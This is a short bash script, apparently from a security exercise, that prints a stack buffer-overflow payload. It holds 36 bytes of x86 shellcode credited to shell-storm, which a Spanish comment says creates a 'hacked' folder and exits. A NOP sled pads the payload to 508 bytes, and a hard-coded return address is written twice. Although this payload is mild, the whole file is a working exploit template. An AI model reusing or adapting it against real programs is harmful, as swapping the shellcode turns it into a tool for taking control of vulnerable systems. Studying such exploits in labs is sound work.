#!/usr/bin/env bash

# http://shell-storm.org/shellcode/files/shellcode-542.php

# Este xploit crea una carpeta "hacked" y sale

# 36 bytes
echo -ne "\xeb\x16\x5e\x31\xc0\x88\x46\x06\xb0\x27\x8d\x1e\x66\xb9\xed\x01\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe5\xff\xff\xff\x68\x61\x63\x6b\x65\x64\x23"

# Added bytes from 37 to 508
for i in $(seq 37 508)
do
    echo -ne "\x90"
done

for i in 1 2
do
   echo -ne "\xbc\xd4\xff\xff"
done